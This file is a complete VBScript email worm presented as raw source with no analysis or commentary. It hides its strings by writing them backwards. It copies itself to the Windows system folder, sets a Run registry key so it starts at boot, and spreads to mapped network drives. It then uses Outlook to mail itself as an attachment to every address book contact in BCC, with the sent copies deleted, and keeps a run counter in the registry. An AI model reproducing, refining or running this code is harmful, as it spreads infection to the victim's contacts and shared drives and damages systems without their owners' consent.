
On Error Resume Next

Dim MA0JM
Dim ZZUJWGMQ
Dim CGGN5
Dim HWKXPB
Dim H5MWZTA
Dim P588
Dim GJF0
Dim BOBX
Dim XVA
Dim IPTF77U

Set MA0JM = CreateObject( UPM0LDP( "tcejbOmetsySeliF.gnitpircS" ) )
MA0JM.CopyFile WScript.ScriptFullName, MA0JM.BuildPath( MA0JM.GetSpecialFolder(1), UPM0LDP( "SBV.35CI" ) )

Set ZZUJWGMQ = CreateObject( UPM0LDP( "llehS.tpircSW" ) )
ZZUJWGMQ.RegWrite UPM0LDP( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & UPM0LDP( "35CI" ), MA0JM.BuildPath( MA0JM.GetSpecialFolder(1), UPM0LDP( "SBV.35CI" ) )


Set CGGN5 = CreateObject( UPM0LDP( "krowteN.tpircSW" ) )
Set H5MWZTA = CGGN5.EnumNetworkDrives

If H5MWZTA.Count <> 0 Then
   For HWKXPB = 0 To H5MWZTA.Count - 1
       If InStr( H5MWZTA.Item( HWKXPB), UPM0LDP( "\" ) ) <> 0 Then
          MA0JM.CopyFile WScript.ScriptFullName, MA0JM.BuildPath( H5MWZTA.Item( HWKXPB), UPM0LDP( "SBV.35CI" ) ) 
       End If
   Next
End If

HWKXPB = ZZUJWGMQ.RegRead( UPM0LDP( "\ENIHCAM_LACOL_YEKH" ) & UPM0LDP( "35CI" ) )

If HWKXPB = "" Or HWKXPB > 20 Then
   HWKXPB = 0
End If

If HWKXPB = 0 Then
   Set BOBX = CreateObject( UPM0LDP( "noitacilppA.kooltuO" ) )
   Set P588 = BOBX.GetNameSpace( UPM0LDP( "IPAM" ) )

   For Each GJF0 In P588.AddressLists
       Set H5MWZTA = BOBX.CreateItem( 0 )

       For XVA = 1 To GJF0.AddressEntries.Count
           Set IPTF77U = GJF0.AddressEntries( XVA )

           If XVA = 1 Then
              H5MWZTA.BCC = IPTF77U.Address
           Else
              H5MWZTA.BCC = H5MWZTA.BCC & UPM0LDP( " ;" ) & IPTF77U.Address
           End If
       Next

       H5MWZTA.Subject = UPM0LDP( "...iuqa megasnem ad tcejbuS o etigiD" )
       H5MWZTA.Body = UPM0LDP( "...iuqa megasnem ad oproc o etigiD" )
       H5MWZTA.Attachments.Add WScript.ScriptFullName
       H5MWZTA.DeleteAfterSubmit = True
       H5MWZTA.Send
   Next

   HWKXPB = 0
End If

ZZUJWGMQ.RegWrite UPM0LDP( "\ENIHCAM_LACOL_YEKH" ) & UPM0LDP( "35CI" ), HWKXPB + 1

Function UPM0LDP( VOK )
   Dim PWKWI3F
   Dim Q7205R
   Dim KA6

   PWKWI3F = ""

   For Q7205R = 1 To Len( VOK )
       KA6 = Mid( VOK, Q7205R, 1 )

       PWKWI3F = KA6 & PWKWI3F
   Next

   UPM0LDP = PWKWI3F
End Function
